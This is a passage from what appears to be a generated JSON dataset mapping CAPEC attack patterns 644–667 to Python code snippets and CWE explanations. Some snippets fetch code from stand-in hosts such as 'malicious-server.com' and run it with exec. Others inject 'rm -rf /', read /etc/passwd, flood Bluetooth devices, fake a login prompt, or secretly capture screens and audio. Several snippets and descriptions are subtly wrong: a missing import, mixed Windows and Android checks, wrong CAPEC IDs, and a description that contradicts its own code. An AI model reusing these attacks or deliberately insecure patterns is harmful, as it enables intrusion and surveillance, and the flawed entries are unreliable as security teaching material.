        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\nshared_directory = '/shared'\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# Assuming the script is running with elevated privileges\nif os.path.exists(shared_directory):\n    for root, dirs, files in os.walk(shared_directory):\n        for file in files:\n            file_path = os.path.join(root, file)\n            try:\n                with open(file_path, 'r') as f:\n                    # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                    content = f.read()\n                    print(f'File: {file_path}\\nContent: {content}\\n')\n            except Exception as e:\n                print(f'Could not read file {file_path}: {e}')\n\n# CWE-427: Uncontrolled Search Path Element\n# Adding a potentially unsafe directory to the search path\nos.environ['PATH'] += os.pathsep + '/unsafe_directory'\n\n# CWE-40: Path Traversal using Windows UNC Share\nunc_path = '\\\\UNC\\share\\name\\file.txt'\ntry:\n    with open(unc_path, 'r') as f:\n        content = f.read()\n        print(f'UNC File Content: {content}')\nexcept Exception as e:\n    print(f'Could not read UNC file {unc_path}: {e}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Identify Shared Files/Directories on System'. The script first checks for the existence of a shared directory and attempts to read and print the contents of all files within it, potentially exposing sensitive information (CWE-200, CWE-552). It assumes elevated privileges (CWE-267) to access these files. The script also modifies the system's search path to include an unsafe directory (CWE-427), and attempts to read a file from a Windows UNC share, which could lead to path traversal issues (CWE-40). This code highlights how an adversary might exploit shared resources and unsafe configurations to gather sensitive information and map potential routes for lateral movement within a network."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing password hashes insecurely\npassword = 'password123'\nhash_object = hashlib.md5(password.encode())\nstored_hash = hash_object.hexdigest()\n\n# Simulate an attacker capturing the hash\ncaptured_hash = stored_hash\n\n# Simulate authentication using the captured hash\ninput_hash = captured_hash\nif input_hash == stored_hash:\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a simplified version of the 'Pass The Hash' attack. It simulates the storage of a password hash using an insecure hashing method (MD5) and then shows how an attacker can capture this hash and use it to authenticate successfully. The code highlights several weaknesses: storing password hashes insecurely (CWE-522), using the hash directly for authentication (CWE-836), and the potential for capture-replay attacks (CWE-294). The code does not implement multi-factor authentication, which is another weakness (CWE-308). This example underscores the importance of secure credential storage and robust authentication mechanisms to prevent such attacks."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport struct\n\n# Simulate capturing a Kerberos ticket from network traffic\ncaptured_ticket = b'\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f'\n\n# Function to replay the captured ticket to authenticate\ndef replay_ticket(ticket):\n    # Create a socket connection to the target service\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('target_service', 88))  # Port 88 is typically used for Kerberos\n    \n    # Send the captured ticket to the service\n    s.send(ticket)\n    \n    # Receive the response from the service\n    response = s.recv(1024)\n    s.close()\n    \n    return response\n\n# Replay the captured ticket\nresponse = replay_ticket(captured_ticket)\nprint(f'Response from service: {response}')",
        "description": "This Python code snippet demonstrates a simplified version of a 'Pass The Ticket' attack, where an adversary captures a Kerberos ticket from network traffic and replays it to authenticate to a target service. The code uses a socket to connect to the target service on port 88 (commonly used for Kerberos), sends the captured ticket, and receives the response. This embodies the main idea of CAPEC-639, highlighting vulnerabilities such as CWE-522 (Insufficiently Protected Credentials) and CWE-294 (Authentication Bypass by Capture-replay). The code does not include actual Kerberos ticket handling but represents the concept of replaying captured authentication tokens."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\n\n# Function to get list of USB devices from Windows Registry\ndef get_usb_devices():\n    usb_devices = []\n    try:\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        key = winreg.OpenKey(reg, r'SYSTEM\\CurrentControlSet\\Enum\\USBSTOR')\n        for i in range(0, winreg.QueryInfoKey(key)[0]):\n            device = winreg.EnumKey(key, i)\n            usb_devices.append(device)\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n    return usb_devices\n\n# Function to simulate malware reporting connected USB devices\ndef report_usb_devices():\n    devices = get_usb_devices()\n    if devices:\n        # Simulate sending data to an unauthorized actor\n        print(\"Reporting USB devices to unauthorized actor:\")\n        for device in devices:\n            print(device)\n    else:\n        print(\"No USB devices found.\")\n\nif __name__ == '__main__':\n    report_usb_devices()",
        "description": "This Python code snippet demonstrates how an adversary might obtain information about USB devices connected to a Windows system by accessing the Windows Registry. The `get_usb_devices` function retrieves a list of USB devices from the registry, and the `report_usb_devices` function simulates the action of malware reporting these devices to an unauthorized actor. This embodies the main idea of the CAPEC 'Peripheral Footprinting' by showing how sensitive system information can be exposed to unauthorized actors. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200, CWE-497) and improper handling of system-level information (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef collect_registry_data():\n    try:\n        registry_path = r'SOFTWARE\\ExampleSoftware'\n        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_READ)\n        value, regtype = winreg.QueryValueEx(registry_key, 'SensitiveData')\n        print(f'Sensitive Data: {value}')\n        winreg.CloseKey(registry_key)\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\nif __name__ == '__main__':\n    collect_registry_data()",
        "description": "This Python code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to collect sensitive data. The function `collect_registry_data` attempts to read a registry key that contains sensitive information ('SensitiveData') stored in cleartext. The code does not perform any authorization checks, assuming the script has the necessary permissions to access the registry. This represents the CAPEC scenario where an adversary gathers system-specific data and sensitive information from the registry, leveraging weaknesses such as improper authorization (CWE-285) and cleartext storage (CWE-314)."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\n# Function to capture screenshots\ndef capture_screenshots(interval, duration, save_path):\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        screenshot = pyautogui.screenshot()\n        timestamp = int(time.time())\n        screenshot.save(os.path.join(save_path, f'screenshot_{timestamp}.png'))\n        time.sleep(interval)\n\n# Example usage\nif __name__ == '__main__':\n    save_path = './screenshots'\n    os.makedirs(save_path, exist_ok=True)\n    capture_screenshots(interval=5, duration=60, save_path=save_path)\n",
        "description": "This Python code snippet captures screenshots of the system's screen at regular intervals and saves them to a specified directory. The `capture_screenshots` function takes three parameters: `interval` (time between screenshots), `duration` (total time to capture screenshots), and `save_path` (directory to save the screenshots). The code uses the `pyautogui` library to capture the screenshots and the `os` library to handle file paths. This code embodies the CAPEC 'Collect Data from Screen Capture' by demonstrating how an adversary could exploit screen capture functionality to gather sensitive information over time. The related CWEs provide context on potential vulnerabilities, such as improper privilege management (CWE-267), exposure of sensitive information (CWE-497), and cleartext transmission (CWE-319), which could be leveraged in conjunction with screen capture to further compromise the system."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\n# Function to check file extension\ndef is_safe_file(file_path):\n    allowed_extensions = ['.txt', '.jpg', '.png']\n    file_extension = os.path.splitext(file_path)[1]\n    if file_extension in allowed_extensions:\n        return True\n    return False\n\n# Example file paths\nfile_paths = ['example.txt ', 'image.jpg', 'document.pdf']\n\n# Check each file\nfor file_path in file_paths:\n    if is_safe_file(file_path):\n        print(f\"{file_path} is safe to process.\")\n    else:\n        print(f\"{file_path} is not safe to process.\")",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Adding a Space to a File Extension'. The function 'is_safe_file' checks if a file has an allowed extension by splitting the file path and comparing the extension against a list of allowed extensions. However, it does not account for trailing spaces in the file extension, which can be exploited by an attacker. For example, 'example.txt ' (with a trailing space) would not be recognized as a '.txt' file and could bypass security checks. This snippet embodies CWE-46 (Path Equivalence: 'filename '), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and other related weaknesses by demonstrating how improper handling of file paths and extensions can lead to security vulnerabilities."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            return 'No file part'\n        file = request.files['file']\n        # If the user does not select a file, the browser submits an empty part without filename\n        if file.filename == '':\n            return 'No selected file'\n        # Save the file to the upload folder\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        return 'File successfully uploaded'\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic file upload functionality using the Flask web framework. The code allows users to upload files to a specified directory on the server. However, it lacks proper security measures, making it vulnerable to several issues described in the CAPEC and related CWEs. Specifically, it does not authenticate users (CWE-287), allows potentially dangerous files to be uploaded (CWE-434), and stores them in a directory that could be externally accessible (CWE-553). This could enable an attacker to upload a web shell, which can then be executed remotely, potentially compromising the server."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport scipy.io.wavfile as wav\n\n# Record audio for 10 seconds\nfs = 44100  # Sample rate\nseconds = 10  # Duration of recording\nprint('Recording...')\nmyrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)\nsd.wait()  # Wait until recording is finished\nprint('Recording finished')\n\n# Save the recording to a file\nwav.write('eavesdropped_audio.wav', fs, myrecording)\nprint('Audio saved to eavesdropped_audio.wav')",
        "description": "This Python code snippet demonstrates a basic form of eavesdropping by recording audio from the microphone and saving it to a file. The code uses the 'sounddevice' library to capture audio for a specified duration and then saves the recording as a WAV file using 'scipy.io.wavfile'. This embodies the CAPEC concept of eavesdropping by intercepting raw audio communication. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is demonstrated by recording potentially sensitive conversations without authorization. CWE-319 (Cleartext Transmission of Sensitive Information) is indirectly represented as the recorded audio is stored in an unencrypted format. CWE-514 and CWE-515 (Covert Channels) are represented by the unauthorized recording and storage of audio data. CWE-1300 (Improper Protection of Physical Side Channels) is represented by the lack of protection against physical eavesdropping through audio recording."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport ssl\n\n# Insecurely storing credentials\ncredentials = {'username': 'admin', 'password': 'password123'}\n\n# Function to simulate Kerberos authentication\ndef kerberos_auth(username, password):\n    if username == credentials['username'] and password == credentials['password']:\n        return 'Authenticated'\n    return 'Authentication Failed'\n\n# Simulate a network service using Kerberos\ndef kerberos_service():\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.load_cert_chain(certfile='server.crt', keyfile='server.key')\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:\n        sock.bind(('localhost', 8443))\n        sock.listen(5)\n        with context.wrap_socket(sock, server_side=True) as ssock:\n            while True:\n                conn, addr = ssock.accept()\n                data = conn.recv(1024)\n                if not data:\n                    break\n                username, password = data.decode().split(',')\n                response = kerberos_auth(username, password)\n                conn.send(response.encode())\n                conn.close()\n\nif __name__ == '__main__':\n    kerberos_service()",
        "description": "This Python code snippet simulates a simple Kerberos authentication service that insecurely stores credentials and uses them for authentication. The credentials are stored in plain text, which is an example of CWE-522 (Insufficiently Protected Credentials). The authentication mechanism relies on a single factor (username and password), which is related to CWE-308 (Use of Single-factor Authentication) and CWE-309 (Use of Password System for Primary Authentication). The service listens for incoming connections and authenticates users based on the provided credentials. This setup is vulnerable to various attacks, including credential theft and replay attacks, embodying the main idea of the CAPEC 'Use of Known Kerberos Credentials'."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import os\nimport getpass\n\n# CWE-522: Insufficiently Protected Credentials\n# Storing credentials in an insecure manner\ncredentials_file = 'credentials.txt'\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# No limit on authentication attempts\nattempts = 0\n\n# CWE-308: Use of Single-factor Authentication\n# Single-factor authentication using only a password\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\n# CWE-309: Use of Password System for Primary Authentication\n# Primary authentication mechanism is password-based\nwith open(credentials_file, 'r') as file:\n    stored_username, stored_password = file.read().splitlines()\n\n# CWE-262: Not Using Password Aging\n# No mechanism for password aging\n# CWE-263: Password Aging with Long Expiration\n# Password expiration period is too long (not implemented here)\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Only checking username and password for authentication\nif username == stored_username and password == stored_password:\n    print('Authentication successful')\nelse:\n    print('Authentication failed')\n    attempts += 1",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code reads credentials from a file and uses them for single-factor authentication. It highlights several related CWEs: CWE-522 (credentials stored insecurely in a file), CWE-307 (no limit on authentication attempts), CWE-308 (single-factor authentication), CWE-309 (password-based primary authentication), CWE-262 and CWE-263 (no password aging mechanism), and CWE-654 (reliance on a single factor for security decisions). The code is vulnerable to various attacks, including credential theft, brute force attacks, and lack of password management."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import simpledialog\n\n# CWE-798: Use of Hard-coded Credentials\nHARDCODED_USERNAME = 'admin'\nHARDCODED_PASSWORD = 'password123'\n\n# Function to simulate credential prompt impersonation\ndef fake_credential_prompt():\n    root = tk.Tk()\n    root.withdraw()  # Hide the main window\n\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    # Display a fake credential prompt\n    username = simpledialog.askstring('Login', 'Enter your username:')\n    password = simpledialog.askstring('Login', 'Enter your password:', show='*')\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Here we would normally send the credentials to a malicious server\n    print(f'Captured credentials - Username: {username}, Password: {password}')\n\n    root.destroy()\n\n# Simulate the attack\nfake_credential_prompt()",
        "description": "This Python code snippet demonstrates a simple example of credential prompt impersonation using the Tkinter library to create a fake login dialog. The code captures the user's input and prints it, simulating the theft of credentials. The hard-coded credentials (CWE-798) are included to show how an attacker might use them for further exploitation. The use of a fake UI layer (CWE-1021) confuses the user into thinking they are entering credentials into a legitimate prompt. The captured credentials are printed, representing insufficient protection (CWE-522) as they could be sent to a malicious server. This snippet embodies the main idea of CAPEC- Credential Prompt Impersonation."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-541: Inclusion of Sensitive Information in an Include File\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef add_data_to_file(file_path, data):\n    try:\n        with open(file_path, 'a') as f:\n            f.write(data)\n            f.write('\\n')\n    except Exception as e:\n        print(f\"Error writing to file: {e}\")\n\n# Create a temporary file (CWE-377)\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\n\n# Add sensitive information to the file (CWE-541)\nsensitive_data = \"username=admin\\npassword=secret\"\nadd_data_to_file(temp_file.name, sensitive_data)\n\n# Add additional data to increase file size (CAPEC-Adding Data)\nlarge_data = \"A\" * 1000000  # 1MB of data\nadd_data_to_file(temp_file.name, large_data)\n\n# Log the file path (CWE-532)\nlog_file = 'log.txt'\nwith open(log_file, 'a') as log:\n    log.write(f\"Temporary file created at: {temp_file.name}\\n\")\n\n# Simulate file upload with dangerous type (CWE-434)\n# and reliance on file extension (CWE-646)\nuploaded_file = 'uploaded_file.txt'\nos.rename(temp_file.name, uploaded_file)\n\nprint(f\"File uploaded as: {uploaded_file}\")",
        "description": "This Python code snippet demonstrates the concept of avoiding security tool identification by adding data to a file, which is the main idea of the CAPEC. The code creates a temporary file (CWE-377) and adds sensitive information to it (CWE-541). It then appends a large amount of data to the file to increase its size (CAPEC-Adding Data). The file path is logged (CWE-532), and the file is renamed to simulate an upload with a potentially dangerous type (CWE-434) while relying on the file extension (CWE-646). This approach can help an adversary mask their actions by increasing the file size and changing its hash, making it harder for security tools to detect the malicious file."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import random\n\nclass VoicePhishingSimulator:\n    def __init__(self):\n        self.legitimate_numbers = ['800-123-4567', '800-987-6543']\n        self.sensitive_info = {'password': 'supersecret', 'ssn': '123-45-6789'}\n\n    def receive_call(self, caller_id):\n        if not self.verify_caller(caller_id):\n            print('Warning: Unverified caller!')\n        else:\n            self.request_sensitive_info()\n\n    def verify_caller(self, caller_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        return caller_id in self.legitimate_numbers\n\n    def request_sensitive_info(self):\n        # CWE-522: Insufficiently Protected Credentials\n        info_requested = random.choice(list(self.sensitive_info.keys()))\n        print(f'Please provide your {info_requested}:')\n        user_input = input()\n        if user_input == self.sensitive_info[info_requested]:\n            print('Information verified.')\n        else:\n            print('Incorrect information.')\n\n# Simulate a voice phishing attack\nsimulator = VoicePhishingSimulator()\nsimulator.receive_call('800-555-1234')  # Example of an unverified caller",
        "description": "This Python code snippet simulates a voice phishing attack scenario. The `VoicePhishingSimulator` class contains methods to receive a call and verify the caller's identity. The `receive_call` method checks if the caller ID is in the list of legitimate numbers (CWE-940: Improper Verification of Source of a Communication Channel). If the caller is not verified, a warning is printed. If the caller is verified, the `request_sensitive_info` method is called, which randomly requests sensitive information from the user (CWE-522: Insufficiently Protected Credentials). The user input is then checked against stored sensitive information to simulate the verification process. This code represents the main idea of a voice phishing attack, where an adversary attempts to solicit sensitive information from the user by masquerading as a legitimate entity."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\n# URL of the update server (spoofed by attacker)\nupdate_url = 'http://malicious-server.com/update'\n\n# Function to download and execute the update\ndef download_and_execute_update(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            # Simulate executing the downloaded update\n            exec(response.text)\n        else:\n            print('Failed to download update')\n    except Exception as e:\n        print(f'Error during update: {e}')\n\n# Trigger the update process\nif __name__ == '__main__':\n    download_and_execute_update(update_url)",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism that can be exploited by an attacker using the 'Malicious Automated Software Update via Spoofing' technique. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the code (CWE-494). The update URL is spoofed to point to a malicious server controlled by the attacker. The downloaded content is executed directly, which could contain embedded malicious code (CWE-506) or replicating malicious code (CWE-509). This example highlights the risk of downloading and executing code without proper security checks, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)  # Dangerous: executing code without integrity check\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport ctypes\nctypes.CDLL('/path/to/untrusted/library.so')  # Dangerous: loading untrusted library\n\n# CWE-78: OS Command Injection\nuser_input = 'some_input; rm -rf /'\nos.system(f'echo {user_input}')  # Dangerous: OS command injection\n\n# Bypass Root/Jailbreak detection\n# Assume is_jailbroken() is a function that checks for jailbreak\noriginal_is_jailbroken = is_jailbroken\ndef fake_is_jailbroken():\n    return False\nis_jailbroken = fake_is_jailbroken  # Hooking to bypass detection\n\n# CWE-497: Exposure of Sensitive System Information\nsensitive_info = os.popen('cat /etc/passwd').read()  # Dangerous: exposing sensitive info\nprint(sensitive_info)\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\ndef custom_url_handler(url):\n    if 'malicious' in url:\n        exec('malicious_code')  # Dangerous: improper authorization\ncustom_url_handler('customscheme://malicious')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Root/Jailbreak Detection Evasion via Hooking' and associated CWEs. The code includes: \n1. CWE-494: Downloading and executing code from an untrusted source without integrity checks.\n2. CWE-829: Loading an untrusted library using ctypes.\n3. CWE-78: OS command injection via user input.\n4. Hooking a function to bypass Root/Jailbreak detection by replacing the original function with a fake one.\n5. CWE-497: Exposing sensitive system information by reading and printing the contents of '/etc/passwd'.\n6. CWE-939: Improper authorization in a custom URL handler that executes code based on the URL content.\n\nThese vulnerabilities illustrate how an adversary can evade Root/Jailbreak detection and perform malicious actions on a compromised mobile device."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\ndef is_debugger_present():\n    return ctypes.windll.kernel32.IsDebuggerPresent() != 0\n\ndef check_root_jailbreak():\n    # Check for common root/jailbreak indicators\n    root_indicators = ['/system/bin/su', '/system/xbin/su', '/system/app/Superuser.apk']\n    for indicator in root_indicators:\n        if os.path.exists(indicator):\n            return True\n    return False\n\ndef main():\n    if is_debugger_present():\n        print('Debugger detected! Exiting...')\n        sys.exit(1)\n    if check_root_jailbreak():\n        print('Root/Jailbreak detected! Exiting...')\n        sys.exit(1)\n    print('Application running normally.')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic implementation of root/jailbreak detection and debugger presence check, which aligns with the CAPEC description. The `is_debugger_present` function uses the Windows API to check if a debugger is attached to the process, addressing CWE-489 (Active Debug Code). The `check_root_jailbreak` function looks for common root/jailbreak indicators on the file system, which can be bypassed if an adversary modifies the binary or uses a debugger to evade these checks. The `main` function exits the application if either a debugger or root/jailbreak is detected, representing a simple mechanism to prevent unauthorized access and potential exploitation. This code snippet highlights the vulnerabilities and potential evasion techniques described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-300: Channel Accessible by Non-Endpoint\nif response.status_code == 200:\n    exec(response.text)  # CWE-506: Embedded Malicious Code\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nuser_input = input('Enter your username: ')\nif user_input == 'admin':\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# CWE-368: Context Switching Race Condition\nimport threading\n\nbalance = 100\nlock = threading.Lock()\n\ndef withdraw(amount):\n    global balance\n    lock.acquire()\n    if balance >= amount:\n        balance -= amount\n    lock.release()\n\nthread1 = threading.Thread(target=withdraw, args=(50,))\nthread2 = threading.Thread(target=withdraw, args=(50,))\nthread1.start()\nthread2.start()\nthread1.join()\nthread2.join()\n\nprint(f'Final balance: {balance}')",
        "description": "This Python code snippet demonstrates several security vulnerabilities that align with the CAPEC 'Adversary in the Browser (AiTB)' and related CWEs. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494), potentially allowing an adversary to inject malicious code (CWE-506). It also shows a simplistic client-side enforcement of security (CWE-602), where user input is used to grant access without proper server-side validation. Additionally, the code includes a race condition in a context-switching scenario (CWE-368), where two threads attempt to withdraw from the same balance concurrently, leading to inconsistent state. These vulnerabilities illustrate how an adversary could exploit a web browser's security flaws to manipulate traffic and compromise endpoints."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import numpy as np\n\n# Simulate speculative execution vulnerability\nsecret_data = np.random.randint(0, 256, size=256)\n\n# Function that should not access secret data\ndef access_data(index):\n    if index < len(secret_data):\n        return secret_data[index]\n    else:\n        return 0\n\n# Simulate branch prediction and speculative execution\nfor i in range(1000):\n    index = np.random.randint(0, 512)  # Out-of-bounds index\n    try:\n        # Speculative execution might access secret_data\n        result = access_data(index)\n    except IndexError:\n        pass\n\n# Covert channel: cache timing attack\ncache_timing = np.zeros(256)\nfor i in range(256):\n    start = time.time()\n    _ = access_data(i)\n    end = time.time()\n    cache_timing[i] = end - start\n\n# Analyze cache timing to infer secret data\nleaked_data = np.argmax(cache_timing)\nprint(f'Leaked secret data: {leaked_data}')",
        "description": "This Python code snippet simulates a speculative execution vulnerability, where an adversary can exploit transient instruction execution to access sensitive data. The `access_data` function is designed to access an array of secret data only if the index is within bounds. However, due to speculative execution, out-of-bounds indices might transiently access the secret data. The code then uses a cache timing attack as a covert channel to infer the secret data. By measuring the time it takes to access different indices, the adversary can deduce which data was accessed speculatively, thus leaking sensitive information."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['POST'])\ndef fetch_url():\n    url = request.form['url']\n    try:\n        response = requests.get(url)\n        return response.content\n    except requests.RequestException as e:\n        return str(e), 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Server Side Request Forgery (SSRF). The '/fetch' endpoint accepts a POST request with a 'url' parameter, which it then uses to make a server-side HTTP GET request using the 'requests' library. The response from this request is returned directly to the client. The vulnerability arises because the input URL is not validated, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external sites, potentially accessing sensitive data or performing unauthorized actions. This example embodies the main idea of CAPEC-918 (SSRF) and highlights CWE-20 (Improper Input Validation) by not validating the input URL, CWE-472 (External Control of Assumed-Immutable Web Parameter) by assuming the 'url' parameter is safe, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to provide a safe URL."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import os\nimport struct\n\n# CWE-1188: Initialization of a Resource with an Insecure Default\nDEFAULT_AUTH_KEY = b'\\x00' * 16  # Insecure default key\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-353: Missing Support for Integrity Check\n# CWE-862: Missing Authorization\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\nclass ThunderboltController:\n    def __init__(self, auth_key=DEFAULT_AUTH_KEY):\n        self.auth_key = auth_key\n        self.memory = bytearray(1024)  # Simulated memory\n\n    def authenticate(self, key):\n        if key == self.auth_key:\n            return True\n        return False\n\n    def read_memory(self, offset, length, key):\n        if self.authenticate(key):\n            return self.memory[offset:offset+length]\n        else:\n            # CWE-288: Bypass authentication by using an alternate path\n            return self.memory[offset:offset+length]  # No authentication check\n\n    def write_memory(self, offset, data, key):\n        if self.authenticate(key):\n            self.memory[offset:offset+len(data)] = data\n        else:\n            # CWE-288: Bypass authentication by using an alternate path\n            self.memory[offset:offset+len(data)] = data  # No authentication check\n\n# Simulate an attack\ncontroller = ThunderboltController()\n\n# Attacker uses default key to read memory\nattacker_key = DEFAULT_AUTH_KEY\nprint(controller.read_memory(0, 16, attacker_key))\n\n# Attacker writes to memory without proper authentication\nmalicious_data = b'\\xAA' * 16\ncontroller.write_memory(0, malicious_data, b'wrong_key')\nprint(controller.read_memory(0, 16, attacker_key))",
        "description": "This Python code snippet simulates a vulnerable Thunderbolt controller that embodies the main idea of the CAPEC 'Exploitation of Thunderbolt Protection Flaws'. The code includes several CWE-related weaknesses: CWE-1188 (Initialization of a Resource with an Insecure Default) is represented by the insecure default authentication key. CWE-345 (Insufficient Verification of Data Authenticity) and CWE-353 (Missing Support for Integrity Check) are demonstrated by the lack of proper data verification and integrity checks. CWE-862 (Missing Authorization) and CWE-288 (Authentication Bypass Using an Alternate Path or Channel) are shown by the ability to read and write memory without proper authentication. The code allows an attacker to exploit these weaknesses to read and write memory using an insecure default key or bypassing authentication altogether."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport time\n\n# Bluetooth address of the target device\ntarget_address = '00:11:22:33:44:55'\n\n# Create a Bluetooth socket using L2CAP protocol\nsock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n\ntry:\n    # Connect to the target device\n    sock.connect((target_address, 0x1001))\n    print(f'Connected to {target_address}')\n\n    # Flood the target device with large packets\n    while True:\n        sock.send(b'A' * 1024)  # Sending large packets\n        time.sleep(0.01)  # Short delay to maintain the flood\nexcept Exception as e:\n    print(f'Error: {e}')\nfinally:\n    # Improper resource shutdown\n    sock.close()\n    print('Socket closed')",
        "description": "This Python code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) on a Bluetooth-enabled device. The code connects to a target Bluetooth device using the L2CAP protocol and continuously sends large packets to flood the device. The code also highlights CWE-404 (Improper Resource Shutdown or Release) by not properly handling the socket resource, which can lead to resource exhaustion. Additionally, the code transmits data in cleartext (CWE-319), which could be sniffed by unauthorized actors. The main idea is to show how an adversary can exploit Bluetooth communication to disrupt the service of a target device."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
